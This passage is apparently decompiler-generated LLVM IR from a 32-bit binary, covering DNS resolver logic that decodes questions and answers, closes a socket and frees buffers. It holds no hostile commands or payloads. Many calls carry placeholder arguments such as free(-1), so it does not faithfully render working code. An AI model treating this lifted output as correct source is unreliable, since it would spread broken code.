dec_label_pc_804f265:                             ; preds = %dec_label_pc_804f1f6
  %v1_804f265 = icmp eq i32 %v3_804f1f6, 0
  %v1_804f267 = icmp eq i1 %v1_804f265, false
  br i1 %v1_804f267, label %dec_label_pc_804f474, label %dec_label_pc_804f26d

dec_label_pc_804f26d:                             ; preds = %dec_label_pc_804f265
  %v1_804f26d = add i32 %v0_804f1dc, 120
  %v2_804f26d = inttoptr i32 %v1_804f26d to i32*
  %v3_804f26d = load i32, i32* %v2_804f26d, align 4
  %tmp50 = icmp slt i32 %v3_804f26d, 1
  br i1 %tmp50, label %dec_label_pc_804f27d, label %dec_label_pc_804f274

dec_label_pc_804f274:                             ; preds = %dec_label_pc_804f26d
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804f29c

dec_label_pc_804f27d:                             ; preds = %dec_label_pc_804f26d
  %v0_804f27d = call i32 @__GI___h_errno_location()
  store i32 %v0_804f27d, i32* %eax.global-to-local, align 4
  %v1_804f282 = inttoptr i32 %v0_804f27d to i32*
  store i32 4, i32* %v1_804f282, align 4
  br label %dec_label_pc_804f518

dec_label_pc_804f28d:                             ; preds = %dec_label_pc_804f29c
  %v2_804f28d = add i32 %v0_804f2a4, -4
  %v3_804f28d = inttoptr i32 %v2_804f28d to i32*
  store i32 %v0_804f28d, i32* %v3_804f28d, align 4
  %v0_804f28e = load i32, i32* @ebx, align 4
  %v1_804f28e = add i32 %v0_804f28e, 1
  store i32 %v1_804f28e, i32* @ebx, align 4
  %v0_804f28f = load i32, i32* @eax, align 4
  %v2_804f28f = add i32 %v0_804f2a4, -8
  %v3_804f28f = inttoptr i32 %v2_804f28f to i32*
  store i32 %v0_804f28f, i32* %v3_804f28f, align 4
  %v0_804f290 = load i32, i32* @esi, align 4
  %v2_804f290 = add i32 %v0_804f2a4, -12
  %v3_804f290 = inttoptr i32 %v2_804f290 to i32*
  store i32 %v0_804f290, i32* %v3_804f290, align 4
  %v2_804f291 = add i32 %v0_804f2a4, -16
  %v3_804f291 = inttoptr i32 %v2_804f291 to i32*
  store i32 %v2_804ee72, i32* %v3_804f291, align 4
  %v0_804f292 = call i32 @__length_question()
  store i32 %v0_804f292, i32* @eax, align 4
  %v0_804f297 = load i32, i32* @esp, align 4
  %v1_804f297 = add i32 %v0_804f297, 16
  %v0_804f29a = load i32, i32* @esi, align 4
  %v2_804f29a = add i32 %v0_804f29a, %v0_804f292
  %v0_804f29c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f29c

dec_label_pc_804f29c:                             ; preds = %dec_label_pc_804f274, %dec_label_pc_804f28d
  %v0_804f28d = phi i32 [ %v3_804f1f6, %dec_label_pc_804f274 ], [ %v0_804f292, %dec_label_pc_804f28d ]
  %v0_804f2a4 = phi i32 [ %v1_804f1dc, %dec_label_pc_804f274 ], [ %v1_804f297, %dec_label_pc_804f28d ]
  %v0_804f29c = phi i32 [ 0, %dec_label_pc_804f274 ], [ %v0_804f29c.pre, %dec_label_pc_804f28d ]
  %storemerge = phi i32 [ 12, %dec_label_pc_804f274 ], [ %v2_804f29a, %dec_label_pc_804f28d ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_804f29c = add i32 %v0_804f2a4, 100
  %v3_804f29c = inttoptr i32 %v2_804f29c to i32*
  %v4_804f29c = load i32, i32* %v3_804f29c, align 4
  %v5_804f29c = sub i32 %v0_804f29c, %v4_804f29c
  %v11_804f29c = xor i32 %v4_804f29c, %v0_804f29c
  %v12_804f29c = xor i32 %v5_804f29c, %v0_804f29c
  %v13_804f29c = and i32 %v12_804f29c, %v11_804f29c
  %v14_804f29c = icmp slt i32 %v13_804f29c, 0
  %v16_804f29c = icmp slt i32 %v5_804f29c, 0
  %v2_804f2a0 = icmp eq i1 %v16_804f29c, %v14_804f29c
  br i1 %v2_804f2a0, label %dec_label_pc_804f2a2, label %dec_label_pc_804f28d

dec_label_pc_804f2a2:                             ; preds = %dec_label_pc_804f29c
  store i32 0, i32* @ebx, align 4
  %v1_804f2a4 = add i32 %v0_804f2a4, 27
  %v2_804f2a4 = inttoptr i32 %v1_804f2a4 to i8*
  store i8 1, i8* %v2_804f2a4, align 1
  %v0_804f3d2.pre = load i32, i32* @ebx, align 4
  %v1_804f3d2.pre = load i32, i32* @esp, align 4
  %v2_804f3d256 = add i32 %v1_804f3d2.pre, 104
  %v3_804f3d257 = inttoptr i32 %v2_804f3d256 to i32*
  %v4_804f3d258 = load i32, i32* %v3_804f3d257, align 4
  %v5_804f3d259 = sub i32 %v0_804f3d2.pre, %v4_804f3d258
  %v11_804f3d261 = xor i32 %v4_804f3d258, %v0_804f3d2.pre
  %v12_804f3d262 = xor i32 %v5_804f3d259, %v0_804f3d2.pre
  %v13_804f3d263 = and i32 %v12_804f3d262, %v11_804f3d261
  %v14_804f3d264 = icmp slt i32 %v13_804f3d263, 0
  %v16_804f3d266 = icmp slt i32 %v5_804f3d259, 0
  %v2_804f3d667 = icmp eq i1 %v16_804f3d266, %v14_804f3d264
  br i1 %v2_804f3d667, label %dec_label_pc_804f3e2, label %dec_label_pc_804f3d8.lr.ph

dec_label_pc_804f3d8.lr.ph:                       ; preds = %dec_label_pc_804f2a2
  %v0_804f3d8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3d8

dec_label_pc_804f2ae:                             ; preds = %dec_label_pc_804f3d8
  %v1_804f2ae = add i32 %v0_804f2ae68, 116
  store i32 %v1_804f2ae, i32* %eax.global-to-local, align 4
  %v2_804f2b2 = add i32 %v0_804f2ae68, -4
  %v3_804f2b2 = inttoptr i32 %v2_804f2b2 to i32*
  store i32 %v1_804f2ae, i32* %v3_804f2b2, align 4
  %v3_804f2b3 = load i32, i32* %v3_804f3d8, align 4
  %v5_804f2b3 = add i32 %v0_804f2ae68, -8
  %v6_804f2b3 = inttoptr i32 %v5_804f2b3 to i32*
  store i32 %v3_804f2b3, i32* %v6_804f2b3, align 4
  %v0_804f2b7 = load i32, i32* @esi, align 4
  %v2_804f2b7 = add i32 %v0_804f2ae68, -12
  %v3_804f2b7 = inttoptr i32 %v2_804f2b7 to i32*
  store i32 %v0_804f2b7, i32* %v3_804f2b7, align 4
  %v2_804f2b8 = add i32 %v0_804f2ae68, -16
  %v3_804f2b8 = inttoptr i32 %v2_804f2b8 to i32*
  store i32 %v2_804ee72, i32* %v3_804f2b8, align 4
  %v0_804f2b9 = call i32 @__decode_answer()
  store i32 %v0_804f2b9, i32* @eax, align 4
  %v1_804f2be = load i32, i32* @esp, align 4
  %v2_804f2be = add i32 %v1_804f2be, 68
  %v3_804f2be = inttoptr i32 %v2_804f2be to i32*
  store i32 %v0_804f2b9, i32* %v3_804f2be, align 4
  %v0_804f2c2 = load i32, i32* @esp, align 4
  %v1_804f2c2 = add i32 %v0_804f2c2, 16
  %v2_804f2c5 = icmp slt i32 %v0_804f2b9, 0
  %v1_804f2c7 = icmp eq i1 %v2_804f2c5, false
  br i1 %v1_804f2c7, label %dec_label_pc_804f2e1, label %dec_label_pc_804f2c9

dec_label_pc_804f2c9:                             ; preds = %dec_label_pc_804f2ae
  %v0_804f2c9 = load i32, i32* @ebx, align 4
  %v1_804f2c9 = icmp eq i32 %v0_804f2c9, 0
  br i1 %v1_804f2c9, label %dec_label_pc_804f474, label %dec_label_pc_804f2d1

dec_label_pc_804f2d1:                             ; preds = %dec_label_pc_804f2c9
  %v1_804f2d1 = add i32 %v0_804f2c2, 100
  %v2_804f2d1 = inttoptr i32 %v1_804f2d1 to i32*
  %v3_804f2d1 = load i32, i32* %v2_804f2d1, align 4
  %v4_804f2d1 = icmp eq i32 %v3_804f2d1, 0
  br i1 %v4_804f2d1, label %dec_label_pc_804f474, label %dec_label_pc_804f3e2

dec_label_pc_804f2e1:                             ; preds = %dec_label_pc_804f2ae
  %v1_804f2e1 = add i32 %v0_804f2c2, 43
  %v2_804f2e1 = inttoptr i32 %v1_804f2e1 to i8*
  %v3_804f2e1 = load i8, i8* %v2_804f2e1, align 1
  %v4_804f2e1 = icmp eq i8 %v3_804f2e1, 0
  br i1 %v4_804f2e1, label %dec_label_pc_804f382, label %dec_label_pc_804f2ec

dec_label_pc_804f2ec:                             ; preds = %dec_label_pc_804f2e1
  %v0_804f2ec = load i32, i32* @edi, align 4
  %v1_804f2ec = add i32 %v0_804f2ec, 28
  %v2_804f2ec = inttoptr i32 %v1_804f2ec to i32*
  %v3_804f2ec = load i32, i32* %v2_804f2ec, align 4
  store i32 %v3_804f2ec, i32* %eax.global-to-local, align 4
  %v2_804f2ef = add i32 %v0_804f2c2, 160
  %v3_804f2ef = inttoptr i32 %v2_804f2ef to i32*
  store i32 %v3_804f2ec, i32* %v3_804f2ef, align 4
  %v0_804f2f6 = load i32, i32* @edi, align 4
  %v1_804f2f6 = add i32 %v0_804f2f6, 32
  %v2_804f2f6 = inttoptr i32 %v1_804f2f6 to i32*
  %v3_804f2f6 = load i32, i32* %v2_804f2f6, align 4
  store i32 %v3_804f2f6, i32* %eax.global-to-local, align 4
  %v1_804f2f9 = load i32, i32* @esp, align 4
  %v2_804f2f9 = add i32 %v1_804f2f9, 148
  %v3_804f2f9 = inttoptr i32 %v2_804f2f9 to i32*
  store i32 %v3_804f2f6, i32* %v3_804f2f9, align 4
  %v0_804f300 = load i32, i32* @edi, align 4
  %v1_804f300 = add i32 %v0_804f300, 36
  %v2_804f300 = inttoptr i32 %v1_804f300 to i32*
  %v3_804f300 = load i32, i32* %v2_804f300, align 4
  store i32 %v3_804f300, i32* %eax.global-to-local, align 4
  %v1_804f303 = load i32, i32* @esp, align 4
  %v2_804f303 = add i32 %v1_804f303, 152
  %v3_804f303 = inttoptr i32 %v2_804f303 to i32*
  store i32 %v3_804f300, i32* %v3_804f303, align 4
  %v0_804f30a = load i32, i32* @ecx, align 4
  %v1_804f30a = load i32, i32* @esp, align 4
  %v2_804f30a = add i32 %v1_804f30a, -4
  %v3_804f30a = inttoptr i32 %v2_804f30a to i32*
  store i32 %v0_804f30a, i32* %v3_804f30a, align 4
  %v1_804f30b = add i32 %v1_804f30a, -8
  %v2_804f30b = inttoptr i32 %v1_804f30b to i32*
  store i32 40, i32* %v2_804f30b, align 4
  %v1_804f30d = add i32 %v1_804f30a, 116
  store i32 %v1_804f30d, i32* %edx.global-to-local, align 4
  %v2_804f311 = add i32 %v1_804f30a, -12
  %v3_804f311 = inttoptr i32 %v2_804f311 to i32*
  store i32 %v1_804f30d, i32* %v3_804f311, align 4
  %v0_804f312 = load i32, i32* @edi, align 4
  %v2_804f312 = add i32 %v1_804f30a, -16
  %v3_804f312 = inttoptr i32 %v2_804f312 to i32*
  store i32 %v0_804f312, i32* %v3_804f312, align 4
  %v4_804f313 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f313, i32* %eax.global-to-local, align 4
  %v0_804f318 = load i32, i32* @edi, align 4
  %v1_804f318 = add i32 %v0_804f318, 4
  %v2_804f318 = inttoptr i32 %v1_804f318 to i32*
  %v3_804f318 = load i32, i32* %v2_804f318, align 4
  store i32 %v3_804f318, i32* %eax.global-to-local, align 4
  %v0_804f31b = load i32, i32* @esp, align 4
  %v1_804f31b = add i32 %v0_804f31b, 16
  %v9_804f31e = icmp eq i32 %v3_804f318, 24
  br i1 %v9_804f31e, label %dec_label_pc_804f2ec.dec_label_pc_804f345_crit_edge, label %dec_label_pc_804f323

dec_label_pc_804f2ec.dec_label_pc_804f345_crit_edge: ; preds = %dec_label_pc_804f2ec
  %.pre25 = add i32 %v0_804f31b, 260
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %v4_804f345.pre = load i32, i32* %.pre26, align 4
  br label %dec_label_pc_804f345

dec_label_pc_804f323:                             ; preds = %dec_label_pc_804f2ec
  %v1_804f323 = add i32 %v0_804f318, 28
  %v2_804f323 = inttoptr i32 %v1_804f323 to i32*
  %v3_804f323 = load i32, i32* %v2_804f323, align 4
  %v4_804f323 = icmp eq i32 %v3_804f323, 0
  br i1 %v4_804f323, label %dec_label_pc_804f3e2, label %dec_label_pc_804f32d

dec_label_pc_804f32d:                             ; preds = %dec_label_pc_804f323
  %v1_804f32d = add i32 %v0_804f31b, 260
  %v2_804f32d = inttoptr i32 %v1_804f32d to i32*
  %v3_804f32d = load i32, i32* %v2_804f32d, align 4
  %v12_804f32d = icmp eq i32 %v3_804f32d, 1
  br i1 %v12_804f32d, label %dec_label_pc_804f345, label %dec_label_pc_804f337

dec_label_pc_804f337:                             ; preds = %dec_label_pc_804f32d
  %v12_804f337 = icmp eq i32 %v3_804f32d, 28
  %v1_804f33f = icmp eq i1 %v12_804f337, false
  br i1 %v1_804f33f, label %dec_label_pc_804f3e2, label %dec_label_pc_804f345

dec_label_pc_804f345:                             ; preds = %dec_label_pc_804f2ec.dec_label_pc_804f345_crit_edge, %dec_label_pc_804f337, %dec_label_pc_804f32d
  %v4_804f345 = phi i32 [ %v4_804f345.pre, %dec_label_pc_804f2ec.dec_label_pc_804f345_crit_edge ], [ %v3_804f32d, %dec_label_pc_804f337 ], [ %v3_804f32d, %dec_label_pc_804f32d ]
  %v15_804f345 = icmp eq i32 %v3_804f318, %v4_804f345
  br i1 %v15_804f345, label %dec_label_pc_804f35a, label %dec_label_pc_804f34e

dec_label_pc_804f34e:                             ; preds = %dec_label_pc_804f345
  %v1_804f351 = inttoptr i32 %v0_804f318 to i32*
  %v2_804f351 = load i32, i32* %v1_804f351, align 4
  %v5_804f351 = inttoptr i32 %v0_804f31b to i32*
  store i32 %v2_804f351, i32* %v5_804f351, align 4
  %v1_804f353 = call i32 @free(i32 -1)
  store i32 %v1_804f353, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f3ca

dec_label_pc_804f35a:                             ; preds = %dec_label_pc_804f345
  %v0_804f35a = load i32, i32* @ebx, align 4
  %v1_804f35c = sub i32 -1, %v0_804f35a
  store i32 %v1_804f35c, i32* %eax.global-to-local, align 4
  %v2_804f35e = add i32 %v0_804f31b, 120
  %v3_804f35e = inttoptr i32 %v2_804f35e to i32*
  %v4_804f35e = load i32, i32* %v3_804f35e, align 4
  %v5_804f35e = add i32 %v4_804f35e, %v1_804f35c
  store i32 %v5_804f35e, i32* %eax.global-to-local, align 4
  %v2_804f362 = add i32 %v0_804f318, 36
  %v3_804f362 = inttoptr i32 %v2_804f362 to i32*
  store i32 %v5_804f35e, i32* %v3_804f362, align 4
  %v0_804f365 = load i32, i32* @edi, align 4
  %v1_804f365 = add i32 %v0_804f365, 16
  %v2_804f365 = inttoptr i32 %v1_804f365 to i32*
  %v3_804f365 = load i32, i32* %v2_804f365, align 4
  %v1_804f368 = add i32 %v3_804f365, 4
  store i32 %v1_804f368, i32* %eax.global-to-local, align 4
  %v2_804f36b = add i32 %v0_804f365, 36
  %v3_804f36b = inttoptr i32 %v2_804f36b to i32*
  %v4_804f36b = load i32, i32* %v3_804f36b, align 4
  %v7_804f36b = mul i32 %v4_804f36b, %v1_804f368
  store i32 %v7_804f36b, i32* %eax.global-to-local, align 4
  %v2_804f36f = add i32 %v0_804f365, 32
  %v3_804f36f = inttoptr i32 %v2_804f36f to i32*
  %v4_804f36f = load i32, i32* %v3_804f36f, align 4
  %v6_804f372 = icmp ugt i32 %v7_804f36b, %v4_804f36f
  br i1 %v6_804f372, label %dec_label_pc_804f35a.dec_label_pc_804f3e2.loopexit_crit_edge, label %dec_label_pc_804f374

dec_label_pc_804f35a.dec_label_pc_804f3e2.loopexit_crit_edge: ; preds = %dec_label_pc_804f35a
  %v0_804f3e2.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f3e2

dec_label_pc_804f374:                             ; preds = %dec_label_pc_804f35a
  store i32 0, i32* %v3_804f36b, align 4
  %v0_804f37b = load i32, i32* @esp, align 4
  %v1_804f37b = add i32 %v0_804f37b, 27
  %v2_804f37b = inttoptr i32 %v1_804f37b to i8*
  store i8 0, i8* %v2_804f37b, align 1
  %v1_804f3cd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f3cd

dec_label_pc_804f382:                             ; preds = %dec_label_pc_804f2e1
  %v1_804f385 = add i32 %v0_804f2c2, 132
  %v2_804f385 = inttoptr i32 %v1_804f385 to i32*
  %v3_804f385 = load i32, i32* %v2_804f385, align 4
  %v6_804f385 = inttoptr i32 %v0_804f2c2 to i32*
  store i32 %v3_804f385, i32* %v6_804f385, align 4
  %v1_804f38c = call i32 @free(i32 -1)
  store i32 %v1_804f38c, i32* %eax.global-to-local, align 4
  %v0_804f391 = load i32, i32* @esp, align 4
  %v1_804f391 = add i32 %v0_804f391, 16
  %v1_804f394 = add i32 %v0_804f391, 260
  %v2_804f394 = inttoptr i32 %v1_804f394 to i32*
  %v3_804f394 = load i32, i32* %v2_804f394, align 4
  store i32 %v3_804f394, i32* %eax.global-to-local, align 4
  %v1_804f39b = add i32 %v0_804f391, 136
  %v2_804f39b = inttoptr i32 %v1_804f39b to i32*
  %v3_804f39b = load i32, i32* %v2_804f39b, align 4
  %v15_804f39b = icmp eq i32 %v3_804f39b, %v3_804f394
  %v1_804f39f = icmp eq i1 %v15_804f39b, false
  br i1 %v1_804f39f, label %dec_label_pc_804f3cd, label %dec_label_pc_804f3a1

dec_label_pc_804f3a1:                             ; preds = %dec_label_pc_804f382
  %v0_804f3a1 = load i32, i32* @edi, align 4
  %v1_804f3a1 = add i32 %v0_804f3a1, 16
  %v2_804f3a1 = inttoptr i32 %v1_804f3a1 to i32*
  %v3_804f3a1 = load i32, i32* %v2_804f3a1, align 4
  store i32 %v3_804f3a1, i32* %eax.global-to-local, align 4
  %v2_804f3a4 = add i32 %v0_804f391, 148
  %v3_804f3a4 = inttoptr i32 %v2_804f3a4 to i32*
  %v4_804f3a4 = load i32, i32* %v3_804f3a4, align 4
  %v15_804f3a4 = icmp eq i32 %v3_804f3a1, %v4_804f3a4
  %v1_804f3ab = icmp eq i1 %v15_804f3a4, false
  br i1 %v1_804f3ab, label %dec_label_pc_804f467, label %dec_label_pc_804f3b1

dec_label_pc_804f3b1:                             ; preds = %dec_label_pc_804f3a1
  %v0_804f3b1 = load i32, i32* @edx, align 4
  %v2_804f3b1 = add i32 %v0_804f391, 12
  %v3_804f3b1 = inttoptr i32 %v2_804f3b1 to i32*
  store i32 %v0_804f3b1, i32* %v3_804f3b1, align 4
  %v0_804f3b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f3b2 = add i32 %v0_804f391, 8
  %v3_804f3b2 = inttoptr i32 %v2_804f3b2 to i32*
  store i32 %v0_804f3b2, i32* %v3_804f3b2, align 4
  %v1_804f3b3 = add i32 %v0_804f391, 152
  %v2_804f3b3 = inttoptr i32 %v1_804f3b3 to i32*
  %v3_804f3b3 = load i32, i32* %v2_804f3b3, align 4
  %v5_804f3b3 = add i32 %v0_804f391, 4
  %v6_804f3b3 = inttoptr i32 %v5_804f3b3 to i32*
  store i32 %v3_804f3b3, i32* %v6_804f3b3, align 4
  %v0_804f3ba = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3ba = load i32, i32* @edi, align 4
  %v2_804f3ba = add i32 %v1_804f3ba, 36
  %v3_804f3ba = inttoptr i32 %v2_804f3ba to i32*
  %v4_804f3ba = load i32, i32* %v3_804f3ba, align 4
  %v7_804f3ba = mul i32 %v4_804f3ba, %v0_804f3ba
  store i32 %v7_804f3ba, i32* %eax.global-to-local, align 4
  %v2_804f3be = add i32 %v1_804f3ba, 28
  %v3_804f3be = inttoptr i32 %v2_804f3be to i32*
  %v4_804f3be = load i32, i32* %v3_804f3be, align 4
  %v5_804f3be = add i32 %v4_804f3be, %v7_804f3ba
  store i32 %v5_804f3be, i32* %eax.global-to-local, align 4
  %v3_804f3c1 = inttoptr i32 %v0_804f391 to i32*
  store i32 %v5_804f3be, i32* %v3_804f3c1, align 4
  %v4_804f3c2 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f3c2, i32* %eax.global-to-local, align 4
  %v0_804f3c7 = load i32, i32* @edi, align 4
  %v1_804f3c7 = add i32 %v0_804f3c7, 36
  %v2_804f3c7 = inttoptr i32 %v1_804f3c7 to i32*
  %v3_804f3c7 = load i32, i32* %v2_804f3c7, align 4
  %v4_804f3c7 = add i32 %v3_804f3c7, 1
  store i32 %v4_804f3c7, i32* %v2_804f3c7, align 4
  br label %dec_label_pc_804f3ca

dec_label_pc_804f3ca:                             ; preds = %dec_label_pc_804f34e, %dec_label_pc_804f3b1
  %v0_804f3ca = load i32, i32* @esp, align 4
  %v1_804f3ca = add i32 %v0_804f3ca, 16
  br label %dec_label_pc_804f3cd

dec_label_pc_804f3cd:                             ; preds = %dec_label_pc_804f382, %dec_label_pc_804f374, %dec_label_pc_804f3ca
  %v1_804f3cd = phi i32 [ %v1_804f391, %dec_label_pc_804f382 ], [ %v1_804f3cd.pre, %dec_label_pc_804f374 ], [ %v1_804f3ca, %dec_label_pc_804f3ca ]
  %v0_804f3cd = load i32, i32* @esi, align 4
  %v2_804f3cd = add i32 %v1_804f3cd, 52
  %v3_804f3cd = inttoptr i32 %v2_804f3cd to i32*
  %v4_804f3cd = load i32, i32* %v3_804f3cd, align 4
  %v5_804f3cd = add i32 %v4_804f3cd, %v0_804f3cd
  store i32 %v5_804f3cd, i32* @esi, align 4
  %v0_804f3d1 = load i32, i32* @ebx, align 4
  %v1_804f3d1 = add i32 %v0_804f3d1, 1
  store i32 %v1_804f3d1, i32* @ebx, align 4
  %v2_804f3d2 = add i32 %v1_804f3cd, 104
  %v3_804f3d2 = inttoptr i32 %v2_804f3d2 to i32*
  %v4_804f3d2 = load i32, i32* %v3_804f3d2, align 4
  %v5_804f3d2 = sub i32 %v1_804f3d1, %v4_804f3d2
  %v11_804f3d2 = xor i32 %v4_804f3d2, %v1_804f3d1
  %v12_804f3d2 = xor i32 %v5_804f3d2, %v1_804f3d1
  %v13_804f3d2 = and i32 %v12_804f3d2, %v11_804f3d2
  %v14_804f3d2 = icmp slt i32 %v13_804f3d2, 0
  %v16_804f3d2 = icmp slt i32 %v5_804f3d2, 0
  %v2_804f3d6 = icmp eq i1 %v16_804f3d2, %v14_804f3d2
  br i1 %v2_804f3d6, label %dec_label_pc_804f3e2, label %dec_label_pc_804f3d8

dec_label_pc_804f3d8:                             ; preds = %dec_label_pc_804f3d8.lr.ph, %dec_label_pc_804f3cd
  %v0_804f3d8 = phi i32 [ %v0_804f3d8.pre, %dec_label_pc_804f3d8.lr.ph ], [ %v5_804f3cd, %dec_label_pc_804f3cd ]
  %v0_804f2ae68 = phi i32 [ %v1_804f3d2.pre, %dec_label_pc_804f3d8.lr.ph ], [ %v1_804f3cd, %dec_label_pc_804f3cd ]
  %v2_804f3d8 = add i32 %v0_804f2ae68, 16
  %v3_804f3d8 = inttoptr i32 %v2_804f3d8 to i32*
  %v4_804f3d8 = load i32, i32* %v3_804f3d8, align 4
  %v5_804f3d8 = sub i32 %v0_804f3d8, %v4_804f3d8
  %v11_804f3d8 = xor i32 %v4_804f3d8, %v0_804f3d8
  %v12_804f3d8 = xor i32 %v5_804f3d8, %v0_804f3d8
  %v13_804f3d8 = and i32 %v12_804f3d8, %v11_804f3d8
  %v14_804f3d8 = icmp slt i32 %v13_804f3d8, 0
  %v16_804f3d8 = icmp slt i32 %v5_804f3d8, 0
  %v2_804f3dc = icmp eq i1 %v16_804f3d8, %v14_804f3d8
  br i1 %v2_804f3dc, label %dec_label_pc_804f3e2, label %dec_label_pc_804f2ae

dec_label_pc_804f3e2:                             ; preds = %dec_label_pc_804f2d1, %dec_label_pc_804f2a2, %dec_label_pc_804f3cd, %dec_label_pc_804f323, %dec_label_pc_804f337, %dec_label_pc_804f3d8, %dec_label_pc_804f35a.dec_label_pc_804f3e2.loopexit_crit_edge
  %v0_804f3e2 = phi i32 [ %v0_804f3e2.pre.pre, %dec_label_pc_804f35a.dec_label_pc_804f3e2.loopexit_crit_edge ], [ %v1_804f3d2.pre, %dec_label_pc_804f2a2 ], [ %v1_804f3cd, %dec_label_pc_804f3cd ], [ %v1_804f31b, %dec_label_pc_804f323 ], [ %v1_804f31b, %dec_label_pc_804f337 ], [ %v0_804f2ae68, %dec_label_pc_804f3d8 ], [ %v1_804f2c2, %dec_label_pc_804f2d1 ]
  %v1_804f3e5 = add i32 %v0_804f3e2, 20
  %v2_804f3e5 = inttoptr i32 %v1_804f3e5 to i32*
  %v3_804f3e5 = load i32, i32* %v2_804f3e5, align 4
  %v5_804f3e5 = add i32 %v0_804f3e2, -16
  %v6_804f3e5 = inttoptr i32 %v5_804f3e5 to i32*
  store i32 %v3_804f3e5, i32* %v6_804f3e5, align 4
  %v1_804f3e9 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804f3e9, i32* %eax.global-to-local, align 4
  %v0_804f3ee = load i32, i32* @esp, align 4
  %v1_804f3f1 = add i32 %v0_804f3ee, 272
  %v2_804f3f1 = inttoptr i32 %v1_804f3f1 to i32*
  %v3_804f3f1 = load i32, i32* %v2_804f3f1, align 4
  %v4_804f3f1 = icmp eq i32 %v3_804f3f1, 0
  br i1 %v4_804f3f1, label %dec_label_pc_804f406, label %dec_label_pc_804f3fb

dec_label_pc_804f3fb:                             ; preds = %dec_label_pc_804f3e2
  store i32 %v3_804f3f1, i32* %edx.global-to-local, align 4
  %v2_804f402 = inttoptr i32 %v3_804f3f1 to i32*
  store i32 %v2_804ee72, i32* %v2_804f402, align 4
  %v0_804f412.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f412

dec_label_pc_804f406:                             ; preds = %dec_label_pc_804f3e2
  %v3_804f409 = inttoptr i32 %v0_804f3ee to i32*
  store i32 %v2_804ee72, i32* %v3_804f409, align 4
  %v1_804f40a = call i32 @free(i32 -1)
  store i32 %v1_804f40a, i32* %eax.global-to-local, align 4
  %v0_804f40f = load i32, i32* @esp, align 4
  %v1_804f40f = add i32 %v0_804f40f, 16
  br label %dec_label_pc_804f412

dec_label_pc_804f412:                             ; preds = %dec_label_pc_804f3fb, %dec_label_pc_804f406
  %v0_804f412 = phi i32 [ %v0_804f412.pre, %dec_label_pc_804f3fb ], [ %v1_804f40f, %dec_label_pc_804f406 ]
  %v1_804f415 = add i32 %v0_804f412, 12
  %v2_804f415 = inttoptr i32 %v1_804f415 to i32*
  %v3_804f415 = load i32, i32* %v2_804f415, align 4
  %v5_804f415 = add i32 %v0_804f412, -16
  %v6_804f415 = inttoptr i32 %v5_804f415 to i32*
  store i32 %v3_804f415, i32* %v6_804f415, align 4
  %v1_804f419 = call i32 @free(i32 -1)
  store i32 %v1_804f419, i32* @eax, align 4
  %v0_804f41e = load i32, i32* @esp, align 4
  %v1_804f421 = add i32 %v0_804f41e, 8
  %v2_804f421 = inttoptr i32 %v1_804f421 to i32*
  store i32 ptrtoint (i8** @global_var_8055de8.398 to i32), i32* %v2_804f421, align 4
  %v1_804f426 = add i32 %v0_804f41e, 4
  %v2_804f426 = inttoptr i32 %v1_804f426 to i32*
  store i32 134535499, i32* %v2_804f426, align 4
  %v1_804f42b = add i32 %v0_804f41e, 200
  store i32 %v1_804f42b, i32* %ebx.global-to-local, align 4
  %v3_804f432 = inttoptr i32 %v0_804f41e to i32*
  store i32 %v1_804f42b, i32* %v3_804f432, align 4
  %v2_804f433 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f433, i32* %eax.global-to-local, align 4
  %v0_804f438 = load i32, i32* @esp, align 4
  %v1_804f438 = inttoptr i32 %v0_804f438 to i32*
  store i32 ptrtoint (i8** @global_var_8055de8.398 to i32), i32* %v1_804f438, align 4
  %v1_804f43f = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f43f, i32* %eax.global-to-local, align 4
  %v0_804f444 = load i32, i32* @esp, align 4
  %v1_804f444 = add i32 %v0_804f444, 56
  %v2_804f444 = inttoptr i32 %v1_804f444 to i32*
  %v3_804f444 = load i32, i32* %v2_804f444, align 4
  store i32 %v3_804f444, i32* @eax, align 4
  %v1_804f448 = add i32 %v0_804f444, 60
  %v2_804f448 = inttoptr i32 %v1_804f448 to i32*
  %v3_804f448 = load i32, i32* %v2_804f448, align 4
  store i32 %v3_804f448, i32* %edx.global-to-local, align 4
  %v1_804f44c = inttoptr i32 %v0_804f444 to i32*
  %v3_804f44c = add i32 %v0_804f444, 4
  %v1_804f44d = inttoptr i32 %v3_804f44c to i32*
  %v1_804f44e = sext i32 %v3_804f444 to i64
  store i64 %v1_804f44e, i64* @global_var_8055e00.399, align 512
  %v1_804f453 = trunc i32 %v3_804f448 to i16
  store i16 %v1_804f453, i16* @global_var_805372c.400, align 4
  store i32 1, i32* %v1_804f44d, align 4
  %v0_804f45c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f45c, i32* %v1_804f44c, align 4
  %v2_804f45d = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f45d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f59e

dec_label_pc_804f467:                             ; preds = %dec_label_pc_804f3a1
  %v1_804f46a = inttoptr i32 %v0_804f3a1 to i32*
  %v2_804f46a = load i32, i32* %v1_804f46a, align 4
  %v5_804f46a = inttoptr i32 %v0_804f391 to i32*
  store i32 %v2_804f46a, i32* %v5_804f46a, align 4
  %v1_804f46c = call i32 @free(i32 -1)
  store i32 %v1_804f46c, i32* @eax, align 4
  %v0_804f471 = load i32, i32* @esp, align 4
  %v1_804f471 = add i32 %v0_804f471, 16
  br label %dec_label_pc_804f474

